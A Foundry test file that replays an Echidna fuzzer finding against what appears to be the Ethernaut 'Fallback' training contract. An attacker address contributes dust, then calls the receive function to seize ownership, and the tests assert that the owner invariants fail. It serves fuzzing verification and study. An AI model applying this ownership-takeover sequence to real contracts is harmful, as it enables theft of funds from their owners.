// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {FallbackEchidna} from "challenges/02-Fallback/echidna/FallbackEchidna.sol";

/**
 * @title FallbackEchidnaTest
 * @notice Verify Echidna findings manually
 * @dev Reproduces the attack sequence Echidna discovers
 */
contract FallbackEchidnaTest is Test {
    FallbackEchidna internal echidna;
    address internal attacker = address(0x1337);

    function setUp() public {
        echidna = new FallbackEchidna{value: 100 ether}();
        vm.deal(attacker, 100 ether);
    }

    function testPropertyHoldsInitially() public {
        assertTrue(echidna.echidna_owner_never_changes());
        assertTrue(echidna.echidna_owner_has_1000eth());
        assertTrue(echidna.echidna_owner_not_zero());
        assertTrue(echidna.echidna_owner_has_contribution());
    }

    function testEchidnaCounterexample() public {
        console2.log("====================================");
        console2.log("Reproducing Echidna Counterexample");
        console2.log("====================================");

        address originalOwner = echidna.owner();
        console2.log("Original owner", originalOwner);
        console2.log("Attacker", attacker);

        // Property holds before attack
        assertTrue(echidna.echidna_owner_never_changes());

        vm.startPrank(attacker);

        // Step 1: contribute dust
        console2.log("Step 1: contribute 0.0001 ether");
        echidna.contribute{value: 0.0001 ether}();
        console2.log("Contribution recorded", echidna.contributions(attacker));

        // Property still holds after contribution
        assertTrue(echidna.echidna_owner_never_changes());

        // Step 2: trigger receive path
        console2.log("Step 2: trigger receive() with 0.0001 ether");
        (bool success,) = address(echidna).call{value: 0.0001 ether}("");
        require(success, "fallback call failed");
        console2.log("New owner", echidna.owner());

        vm.stopPrank();

        console2.log("====================================");
        console2.log("Property status");
        console2.log("====================================");
        console2.log("owner_never_changes", echidna.echidna_owner_never_changes());
        console2.log("owner_has_1000eth", echidna.echidna_owner_has_1000eth());
        console2.log("owner_not_zero", echidna.echidna_owner_not_zero());
        console2.log("owner_has_contribution", echidna.echidna_owner_has_contribution());
        console2.log("====================================");

    console2.log("Attack cost", uint256(0.0002 ether));
    console2.log("Contribution balance", echidna.contributions(attacker));

        assertFalse(echidna.echidna_owner_never_changes());
        assertFalse(echidna.echidna_owner_has_1000eth());
        assertTrue(echidna.echidna_owner_not_zero());
        assertTrue(echidna.echidna_owner_has_contribution());
        assertEq(echidna.owner(), attacker);
    }

    function testReceiveFunctionDirectly() public {
        vm.startPrank(attacker);
        echidna.contribute{value: 0.0001 ether}();
        uint256 balanceBefore = address(echidna).balance;
        (bool success,) = address(echidna).call{value: 0.0001 ether}("");
        assertTrue(success);
        assertEq(echidna.owner(), attacker);
        assertEq(address(echidna).balance, balanceBefore + 0.0001 ether);
        vm.stopPrank();
    }

    function testCannotTriggerReceiveWithoutContribution() public {
        vm.startPrank(attacker);
    vm.expectRevert();
    (bool success,) = address(echidna).call{value: 0.0001 ether}("");
    success; // silence unused variable warning
        vm.stopPrank();
    }
}
